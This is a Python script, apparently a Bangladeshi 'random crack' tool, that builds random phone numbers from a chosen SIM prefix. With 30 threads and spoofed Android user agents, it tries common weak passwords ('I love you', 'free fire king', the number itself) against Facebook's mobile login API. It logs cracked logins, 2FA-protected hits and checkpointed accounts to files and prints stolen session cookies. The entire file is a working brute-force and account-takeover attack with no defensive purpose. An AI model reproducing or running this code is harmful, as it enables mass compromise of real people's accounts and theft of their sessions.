import os
import time
import sys
from os import path
import urllib
import pip
import base64
import zlib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
#--------------------- [ SEX ] -------------------#
model2 = requests.get('https://7gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
jan = []
loop=0
oks=[]
cps=[]
twf=[]

def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/417.0.0.33.65;FBBV/318819992;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/Banglalink;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

#--------------------- [ CODE ] -------------------#
W='\033[1;37m' #WHITE
G='\033[38;5;46m'
F='\033[38;5;45m'
R='\033[38;5;196m'
#--------------------- [ LOGO ] -------------------#
fuck = """
  
  ____   ____ _______ 
 |  _ \ / __ \__   __|
 | |_) | |  | | | |   
 |  _ <| |  | | | |   
 | |_) | |__| | | |   
 |____/ \____/  |_|   
                      
                      

===================================
=================================== """
#--------------------- [ DEF-LOGO X CLEAR ] -------------------#
def x():
    os.system('clear')
    print(fuck)
#--------------------- [ DEF-XNXX ] -------------------#
def xnxx():
    print(f'{W}===================================')
#--------------------- [ MAIN ] -------------------#
def BOTxx():
    x()
    print('[1] RNDM CRACK')
    print('[2] EXIT');xnxx()
    xtx = input('[?] CHOICE : ')
    if xtx in '1':
        rndmx()
    elif xtx in '2':
        print('Allah hafiz ')
        os.system('exit')
#--------------------- [ RNDM ] -------------------#
def rndmx():
    x()
    print('[+] BD SIM CODE : 017,019,018,016 ');xnxx()
    dog = input('[?] CODE : ')
    x()
    try:
        print('[+] LIMIT : 999,9999,99999');xnxx()
        limit = int(input('[?] LIMIT : '))
    except ValueError:
            limit = 5000
    for nmbr in range(limit):
            xxx = ''.join(random.choice(string.digits) for _ in range(8))
            jan.append(xxx)
    with tred(max_workers=30) as tanox:
            x()
            tl = str(len(jan))
            print(f'[+] TOTAL UID : {str(len(jan))}')
            print(f'[+] USE JAPAN APN COMING MORE OK IDS.......');xnxx()
            for psx in jan:
                ids = dog+psx
                passlist = [psx,ids,ids[:8],ids[:7],'bangla','fast name@@','fast name@@##','Bangladesh','fast name143','I love you','I Love You','free fire king','pubg king','free fire BD']
                tanox.submit(sexx,ids,passlist)
    xnxx()
    print(f'[+] TOTAL OK -{str(len(oks))}')
    xnxx()
#--------------------- [ MTHD ] -------------------#
def sexx(ids,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r[+] [BOT FIND] [{loop}] [OK:-{len(oks)}]')
        sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        cat = {
                        
                        
                        
                        
                        
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',                              
                                'error_detail_type':'button_with_disabled',                                
                                'enroll_misauth':'false',                             
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        
                        
                        
                        
                        
                        BOT={
                        
                        
                        
                        
                        
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent': randBuildLSB(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                                
                                
                                
                                
                                
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=cat,headers=BOT).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print(f'\r\r\033[38;5;46m[+] [BOT-OK] {str(uid)} \_/ {pas} ')
                                        fxxk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'=COOKIE= : {fxxk}')
                                        open('/sdcard/X-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif twf in str(po):
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = idf
                                if uid in oks:pass
                                else:
                                        print(f'\r\r\033[38;5;45m[+] [BOT-2F] {uid} \_/ {pas}\033[1;37m')
                                        open('/sdcard/X-2F.txt','a').write(str(uid)+'|'+pas+'\n')
                                        twf.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\033[38;5m196m[+] [BOT-CP] '+str(uid)+' \_/ '+pas+'\033[1;37m')
                                        open('/sdcard/X-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#--------------------- [ END ] -------------------#
BOTxx()
